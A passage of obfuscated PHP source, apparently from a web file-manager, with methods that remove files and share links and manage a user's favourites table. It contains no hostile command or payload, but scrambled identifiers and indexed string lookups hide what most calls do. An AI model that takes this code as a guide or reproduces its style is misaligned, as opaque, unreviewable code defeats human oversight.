IO::has($âﬁ”∞§Ù, !0); if (!$Êá¯€¬Î[$çúü‘—ˆ[251]] && !$Êá¯€¬Î[$çúü‘—ˆ[252]]) { IO::remove($âﬁ”∞§Ù); } } } return $this->remove($´…ò¡•˝); } private function removeByFileID($∂ã£û˜‘ = array()) { $˚∫õªüÀ =& $_SERVER[ˆë€Ï⁄∂]; if (empty($∂ã£û˜‘)) { return; } $–ÎîçÛ€ = array($˚∫õªüÀ[552] => array($˚∫õªüÀ[7], $∂ã£û˜‘)); $•¸àå°ö = Model($˚∫õªüÀ[1436])->where($–ÎîçÛ€)->field($˚∫õªüÀ[203])->select(); if (!$•¸àå°ö) { return Model($˚∫õªüÀ[555])->remove($∂ã£û˜‘); } $•¸àå°ö = array_to_keyvalue($•¸àå°ö, $˚∫õªüÀ[12], $˚∫õªüÀ[203]); foreach ($•¸àå°ö as $Êˆ¬’¢≠) { Model($˚∫õªüÀ[916])->removeNow($Êˆ¬’¢≠, !1); } } private function removeShareItems($Ê‹®¢Ó˛) { $¨˜·™∏¡ =& $_SERVER[ˆë€Ï⁄∂]; $˛ßà¨‰¥ = "\x7b\151\157\x3a{$Ê‹®¢Ó˛}\x7d\57"; $„≤œ…à¬ = array($¨˜·™∏¡[203] => 0, $¨˜·™∏¡[1272] => array($¨˜·™∏¡[470], "{$˛ßà¨‰¥}\45")); $‹Ç¡ø≤≠ = Model($¨˜·™∏¡[1967])->where($„≤œ…à¬)->field($¨˜·™∏¡[679])->select(); if (empty($‹Ç¡ø≤≠)) { return; } $Î≈ÍìÉŸ = array_to_keyvalue($‹Ç¡ø≤≠, $¨˜·™∏¡[12], $¨˜·™∏¡[679]); Model($¨˜·™∏¡[678])->remove($Î≈ÍìÉŸ); } } goto C∏ßê…€±ﬁ; Eî¯∑˜†ê¿: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($èü±µ¿Í) { $≈ª∏ïÈ =& $_SERVER[ˆë€Ï⁄∂]; return array($≈ª∏ïÈ[2103] => array($≈ª∏ïÈ[2531] . USER_ID, $≈ª∏ïÈ[2104])); } protected function listData() { $’Ÿó∞˛¯ =& $_SERVER[ˆë€Ï⁄∂]; $˜Ë˝ÅÚ∆ = array($’Ÿó∞˛¯[1778] => USER_ID, $’Ÿó∞˛¯[568] => array($’Ÿó∞˛¯[2107], 0)); $…∂∆ò˚∏ = $’Ÿó∞˛¯[2532]; $æ»ÍﬁÍ⁄ = $this->field($…∂∆ò˚∏)->where($˜Ë˝ÅÚ∆)->order($’Ÿó∞˛¯[2110])->select(); return $æ»ÍﬁÍ⁄ ? $æ»ÍﬁÍ⁄ : array(); } protected function addToTag($‚¡˛¯Ω«, $€Ñ©ΩùÅ) { $ı¶Ç≠ =& $_SERVER[ˆë€Ï⁄∂]; if (!Model($ı¶Ç≠[2259])->listData($€Ñ©ΩùÅ)) { return !1; } if (is_numeric($‚¡˛¯Ω«)) { $°°–˘€û = Model($ı¶Ç≠[916])->pathInfo($‚¡˛¯Ω«); if (!$°°–˘€û) { return !1; } } else { $°°–˘€û = IO::infoSimple($‚¡˛¯Ω«); if (!$°°–˘€û) { return !1; } $∞í¡ÂŸË = $°°–˘€û[$ı¶Ç≠[32]]; $ä≈ê∑∏Ñ = $°°–˘€û[$ı¶Ç≠[33]]; if (isset($°°–˘€û[$ı¶Ç≠[496]])) { $ä≈ê∑∏Ñ = $°°–˘€û[$ı¶Ç≠[496]] == $ı¶Ç≠[101] ? $ı¶Ç≠[88] : $ı¶Ç≠[242]; } } $ÖÅü†Í– = array($ı¶Ç≠[1778] => USER_ID, $ı¶Ç≠[568] => $€Ñ©ΩùÅ, $ı¶Ç≠[506] => $‚¡˛¯Ω«, $ı¶Ç≠[507] => $ä≈ê∑∏Ñ ? $ä≈ê∑∏Ñ : $ı¶Ç≠[501], $ı¶Ç≠[505] => $∞í¡ÂŸË ? $∞í¡ÂŸË : $ı¶Ç≠[12], $ı¶Ç≠[1992] => 0); if ($this->where($ÖÅü†Í–)->find()) { return !1; } return $this->add($ÖÅü†Í–); } protected function removeFromTag($≈∞∑Û◊Í, $–©Òõ‰ö) { $¯‹’»Æˆ =& $_SERVER[ˆë€Ï⁄∂]; if (!Model($¯‹’»Æˆ[2259])->listData($–©Òõ‰ö)) { return !1; } if (is_array($≈∞∑Û◊Í)) { $≈∞∑Û◊Í = array($¯‹’»Æˆ[7], $≈∞∑Û◊Í); } $œ€≈åáÁ = array($¯‹’»Æˆ[1778] => USER_ID, $¯‹’»Æˆ[568] => $–©Òõ‰ö, $¯‹’»Æˆ[506] => $≈∞∑Û◊Í); return $this->where($œ€≈åáÁ)->delete(); } protected function removeByTag($‚°Úã°˘) { $ÙÉ”÷‚ı =& $_SERVER[ˆë€Ï⁄∂]; if (!$‚°Úã°˘) { return !1; } $√ÚºüÎæ = array($ÙÉ”÷‚ı[1778] => USER_ID, $ÙÉ”÷‚ı[568] => $‚°Úã°˘); return $this->where($√ÚºüÎæ)->delete(); } protected function removeBySource($®ÛıÆƒò) { $ïÀñáú√ =& $_SERVER[ˆë€Ï⁄∂]; if (is_array($®ÛıÆƒò)) { $®ÛıÆƒò = array($ïÀñáú√[7], $®ÛıÆƒò); } $è Ã≤˛Ø = array($ïÀñáú√[1778] => USER_ID, $ïÀñáú√[568] => array($ïÀñáú√[1106], 0), $ïÀñáú√[506] => $®ÛıÆƒò); return $this->where($è Ã≤˛Ø)->delete(); } }